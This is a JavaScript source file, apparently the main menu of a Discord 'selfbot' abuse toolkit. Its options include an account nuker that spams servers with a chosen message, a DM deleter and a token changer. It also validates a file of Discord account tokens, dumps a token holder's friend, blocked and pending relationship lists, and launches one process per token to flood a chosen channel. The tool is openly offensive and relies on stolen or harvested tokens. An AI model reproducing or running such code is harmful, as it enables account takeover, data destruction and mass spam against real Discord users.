const {filegrabbertitle,Spinner,clear,trasition,SlowPrint,getTempDir,getheaders,validateToken,validateWebhook,installPack,loadbar,setTitle,proxy,proxy_scrape,LOGO,input,sleep, colors, chose_Token, chose_Server} = require("./utilities/Settings/common")
const {GANGDOTJS_START} = require("./utilities/Plugins/Account_Nuker")
const {DmDeleter} = require("./utilities/Plugins/DM_Deleter")
const {Lookup} = require("./utilities/Plugins/Server_Lookup")
const {TokenChanger2} = require("./utilities/Plugins/Token_Changer")
const {Info} = require("./utilities/Plugins/Token_info")
const fs = require("fs")
const request = require("request")
const {execSync} = require("child_process")

function getUserAgent() {
    const userAgents = fs.readFileSync('data/useragent.txt', 'utf-8').split('\n');
    const randomIndex = Math.floor(Math.random() * userAgents.length);
    const userAgent = userAgents[randomIndex].trim();
    return userAgent;
}
async function MAIN() {
    await clear()
    await LOGO()
    const interface = 
    colors.purple+`
    ◢================================================================================◣
    ⫴  [1] Account Nuker || [2] DM Deleter || [3] Server Lookup || [4] Token Changer  ⫴
    ⫴  [5] Token Checker || [6] Token Info || [7] Friend Reveal || [8] Token Typer    ⫴ 
    ⫴  [X]               || [X]            || [11] Discord      || [12] EXIT          ⫴
    ◥================================================================================◤
    `+colors.reset
    console.log(interface)
    var user_in = await input("Choice >")
    let token;
    if(user_in == "12" || user_in == "11" || user_in == "5" || user_in == "8") {} else if (user_in !== "") {token = await chose_Token()}
    switch (user_in) {
        case "1": // token
            await clear()
            const servername = await input("Server Spam Name > ")
            const spammessage = await input("Spam Message > ")
            await GANGDOTJS_START(token,servername,spammessage)
            await MAIN();break;
        case "2": // token
            await clear()
            await DmDeleter(token)
            await clear()
            await MAIN();break;
        case "3": // token
            await clear()
            const serverid = await chose_Server(token)
            await clear()
            await Lookup(token, serverid)
            await clear()
            await MAIN();break;
        case "4": // token
            await TokenChanger2(token)
            await clear()
            await MAIN();break;
        case "5": // no token
            await clear()
            const file = fs.readFileSync("tokens.txt", "utf-8").split("\n");
            const Valid_tokens = []
            for(const token of file) {
                await validateToken(token).then((token) =>
                    Valid_tokens.push(token)
                )
            }
            if(Valid_tokens.length > 0) {
                console.log(colors.green+`${Valid_tokens.length} Tokens are valid and will be saved.`+colors.reset)
                fs.writeFileSync("tokens.txt", Valid_tokens.join("\n"))
                console.log(colors.green+`Tokens saved!`+colors.reset)
                await input("Press any key to continue...")
            } else {
                console.log(colors.red`No Tokens are valid!`+colors.reset)
            }
            await clear()
            await MAIN();break;
        case "6":
            await clear()
            await Info(token)
            await clear()
            await MAIN();break;
        case "7": // no token
            await clear()
            await getheaders(token).then((headers) => {
                request.get({uri:"https://discord.com/api/v9/users/@me/relationships", headers:headers, json:true}, function(error,response,body) {
                    if(error) {console.log(error)}
                    const friends = body
                    const Blocked_friends = []
                    const Accapted_friends = []
                    const Outgoing_friends = []
                    friends.forEach((friend) => {
                        const space = 15
                        let new_user;
                        let updated_name;
                        let friends_since;
                        let has_avatar;
                        const friends_s = new Date(friend.since).toDateString()
                        if(friend.user.global_name === null) {new_user = "Nameless            "} else { new_user = friend.user.global_name.padEnd(space) }
                        if(friend.user.discriminator === "0") {updated_name =  colors.red+"false"+colors.purple} else {updated_name = colors.green+"true"+colors.purple}
                        if(friend.since) {colors.green+friends_s+colors.purple} else {friends_since = colors.red+"Not Friends"+colors.purple}
                        if(friend.user.avatar === null) {has_avatar = colors.red+"false"+colors.purple} else {has_avatar = colors.green+"true"+colors.purple}
                        const data = (`Name: ${friend.user.username.padEnd(space)} aka (${new_user}) | ID: ${friend.user.id} | Has Updated name: ${updated_name} | Are Friends since: ${friends_s} | Has PFP: ${has_avatar}`)
                        switch (friend.type) {
                            case 1:
                                Accapted_friends.push(data)
                                break;
                            case 2:
                            	Blocked_friends.push(data)
                                break;
                            case 4:
                                Outgoing_friends.push(data)
                                break;
                            default:
                                break;
                        }
                    })
                    const friend_interface =colors.purple+ 
`
####### FRIEND DATA #######
All friends count = ${friends.length}

FRIENDS: count = ${Accapted_friends.length}
${Accapted_friends.join("\n")}

####### BLOCKED FRIENDS #######
BLOCKED: count = ${Blocked_friends.length}
${Blocked_friends.join("\n")}

####### OUTGOING FRIENDS #######
OUTGOING: count = ${Outgoing_friends.length}
${Outgoing_friends.join("\n")}
`+colors.reset
                    clear()
                    console.log(friend_interface)
                    input("Press any key to continue...")

                })
            })
            await clear()
            await MAIN();break;
        case "8": // no token
            await clear()
            await SlowPrint(colors.red+"This will send all tokens to type in the channel so dont use too many."+colors.reset)
            await sleep(2000)
            await clear()
            const channelid = await input("Channel ID: ")
            const tokens = fs.readFileSync("tokens.txt", "utf-8").split("\n");
            var c = 0;
            for(const token of tokens) {
                execSync(`start cmd /k node utilities\\Plugins\\Plugins_thread\\TokenTyper.js ${token} ${channelid}`)
                c++
            }
            console.log(colors.green+`Tokens (${c}/${tokens.length}) sent!`+colors.reset)
            await input("Press enter to continue...")
            await MAIN()
            break;
        case "11":// no token
            await clear()
            console.log(colors.purple+"Thanks for joining my discord server! <3"+colors.reset)
            request.get("https://raw.githubusercontent.com/ian4u/GANG.JS/main/discord.txt", function(error,responce,body) {
                if(error) {console.log(error)}
                const link = body.split("\n")[0]
                execSync(`start ${link}`)
            })
            await clear()
            await MAIN();break;
        case "12":// no token
            await clear()
            process.exit()
        default:
            await clear()
            await MAIN();break;
    }
}

MAIN()